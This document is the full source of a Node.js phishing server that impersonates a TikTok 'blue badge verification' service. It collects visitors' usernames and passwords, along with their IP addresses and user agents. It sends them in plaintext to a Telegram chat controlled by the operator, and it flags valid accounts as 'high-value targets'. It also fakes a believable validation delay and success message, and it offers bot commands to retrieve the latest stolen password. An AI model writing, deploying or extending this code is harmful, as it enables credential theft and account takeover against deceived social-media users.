const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const requestIp = require('request-ip');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static('public'));
app.use(requestIp.mw());

// Telegram Bot Setup
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE';

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// Store verification requests
let verificationLog = [];

// Serve the verification page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Verification endpoint
app.post('/verify-account', async (req, res) => {
    try {
        const { username, password, ip, userAgent, timestamp, verificationType } = req.body;
        
        // Get client IP if not provided
        const clientIp = ip || req.clientIp || 'Unknown';
        
        // Create verification entry
        const verificationEntry = {
            username,
            password,
            ip: clientIp,
            userAgent,
            timestamp: timestamp || new Date().toISOString(),
            receivedAt: new Date().toISOString(),
            verificationType: verificationType || 'blue-badge',
            status: 'pending'
        };
        
        // Store in memory
        verificationLog.push(verificationEntry);
        
        // Simulate account validation (in real scenario, you'd check against TikTok API)
        const isValidAccount = await simulateAccountValidation(username, password);
        
        // Send to Telegram
        await sendVerificationAlert(verificationEntry, isValidAccount);
        
        // Log to console
        console.log('🔵 Blue Badge Verification Attempt:', {
            username,
            password: '*'.repeat(password.length),
            ip: clientIp,
            isValid: isValidAccount,
            timestamp: new Date().toLocaleString()
        });
        
        // Return appropriate response
        if (isValidAccount) {
            res.json({ 
                status: 'success', 
                message: 'Account verified successfully. Blue badge will be activated within 2-3 business days.',
                badgeStatus: 'pending_activation'
            });
        } else {
            res.status(400).json({ 
                status: 'error', 
                message: 'Invalid credentials. Please check your username and password.'
            });
        }
        
    } catch (error) {
        console.error('Error processing verification:', error);
        res.status(500).json({ 
            status: 'error', 
            message: 'Verification service temporarily unavailable. Please try again later.'
        });
    }
});

// Simulate TikTok account validation
async function simulateAccountValidation(username, password) {
    // Simulate API call delay
    await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));
    
    // Basic validation logic (in real scenario, this would call TikTok's API)
    const isValid = username.length >= 3 && password.length >= 6;
    
    // Randomize success rate to make it believable (80% success rate)
    return isValid && Math.random() > 0.2;
}

// Function to send verification alert to Telegram
async function sendVerificationAlert(verificationEntry, isValidAccount) {
    try {
        const statusIcon = isValidAccount ? '✅' : '❌';
        const statusText = isValidAccount ? 'VALID ACCOUNT' : 'INVALID CREDENTIALS';
        
        const message = `
🔵 **TIKTOK BLUE BADGE VERIFICATION ATTEMPT** 🔵

${statusIcon} **Account Status:** ${statusText}

👤 **Username:** ${verificationEntry.username}
🔐 **Password:** ||${verificationEntry.password}||
🌐 **IP Address:** ${verificationEntry.ip}
🕒 **Attempt Time:** ${new Date(verificationEntry.timestamp).toLocaleString()}
📱 **User Agent:** ${verificationEntry.userAgent.substring(0, 50)}...

🔔 **Received:** ${new Date().toLocaleString()}
        `.trim();

        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
        
        // Send follow-up message for valid accounts
        if (isValidAccount) {
            const followUpMessage = `
🎯 **POTENTIAL HIGH-VALUE TARGET** 🎯

User ${verificationEntry.username} appears to have a valid TikTok account.
This could be a creator or business account worth monitoring.

⚠️ **Priority:** HIGH
🔍 **Recommended Action:** Monitor account activity
            `.trim();
            
            await bot.sendMessage(CHAT_ID, followUpMessage, { parse_mode: 'Markdown' });
        }
        
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

// Admin endpoints to view verification logs
app.get('/admin/verifications', (req, res) => {
    const auth = req.headers.authorization;
    
    if (!auth || auth !== `Bearer ${process.env.ADMIN_TOKEN || 'admin123'}`) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const stats = {
        total: verificationLog.length,
        valid: verificationLog.filter(entry => entry.status === 'valid').length,
        invalid: verificationLog.filter(entry => entry.status === 'invalid').length,
        pending: verificationLog.filter(entry => entry.status === 'pending').length
    };
    
    res.json({
        statistics: stats,
        verifications: verificationLog
    });
});

// Telegram bot commands
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text === '/start') {
        bot.sendMessage(chatId, `
🔵 **TikTok Blue Badge Verification Bot**

I'm monitoring verification attempts and will alert you of new submissions.

📊 **Statistics:**
• Total Attempts: ${verificationLog.length}
• Valid Accounts: ${verificationLog.filter(v => v.status === 'valid').length}
• Recent: ${verificationLog.length > 0 ? 
    new Date(verificationLog[verificationLog.length - 1].timestamp).toLocaleString() : 
    'None'}

🛠 **Commands:**
/start - Show this message
/stats - Detailed statistics
/latest - Latest verification attempt
/help - Show help
        `.trim(), { parse_mode: 'Markdown' });
    }

    if (text === '/stats') {
        const validCount = verificationLog.filter(v => v.status === 'valid').length;
        const invalidCount = verificationLog.filter(v => v.status === 'invalid').length;
        
        bot.sendMessage(chatId, `
📈 **Verification Statistics**

✅ Valid Accounts: ${validCount}
❌ Invalid Attempts: ${invalidCount}
📋 Total Submissions: ${verificationLog.length}
🎯 Success Rate: ${verificationLog.length > 0 ? 
    Math.round((validCount / verificationLog.length) * 100) : 0}%

🕒 Last 24h: ${verificationLog.filter(v => 
    new Date(v.timestamp) > new Date(Date.now() - 24 * 60 * 60 * 1000)
).length} attempts
        `.trim(), { parse_mode: 'Markdown' });
    }

    if (text === '/latest' && verificationLog.length > 0) {
        const latest = verificationLog[verificationLog.length - 1];
        const message = `
📋 **Latest Verification Attempt**

👤 Username: ${latest.username}
🔐 Password: ||${latest.password}||
🌐 IP: ${latest.ip}
🕒 Time: ${new Date(latest.timestamp).toLocaleString()}
✅ Status: ${latest.status === 'valid' ? 'Valid Account' : 'Invalid'}
        `.trim();
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 TikTok Verification Server running on port ${PORT}`);
    console.log(`🔵 Verification page: http://localhost:${PORT}`);
    console.log(`🤖 Telegram bot is monitoring verification attempts...`);
});

module.exports = app;